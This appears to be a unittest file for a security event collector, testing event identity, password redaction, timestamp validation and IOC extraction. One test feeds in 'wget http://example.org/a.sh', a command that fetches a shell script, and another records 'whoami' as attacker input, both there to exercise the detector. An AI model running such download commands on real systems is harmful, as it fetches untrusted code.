import unittest
from datetime import datetime, timezone

from backend.api import event_identity, safe, timestamp
from backend.routes import extract_iocs


class CoreTests(unittest.TestCase):
    def test_identity_stable_and_distinct(self):
        a = {"_collector": {"source_id": "file:1:0:abc"}}
        b = {"_collector": {"source_id": "file:1:1:def"}}
        self.assertEqual(event_identity(a), event_identity(a))
        self.assertNotEqual(event_identity(a), event_identity(b))

    def test_password_redaction_is_recursive(self):
        self.assertEqual(safe({"password": "secret", "nested": [{"passwd": "other"}], "input": "whoami"}), {"password": "[REDACTED]", "nested": [{"passwd": "[REDACTED]"}], "input": "whoami"})

    def test_timestamp_requires_timezone(self):
        with self.assertRaises(ValueError):
            timestamp("2026-11-01T10:00:00")

    def test_ioc_cites_real_event(self):
        result = extract_iocs("wget http://example.org/a.sh", 42)
        self.assertEqual(result[0]["evento"], 42)
        self.assertEqual(result[0]["tipo"], "URL")

    def test_ioc_rejects_invalid_ip(self):
        self.assertFalse(any(x["tipo"] == "IP" for x in extract_iocs("ping 999.999.999.999", 7)))


if __name__ == "__main__":
    unittest.main()
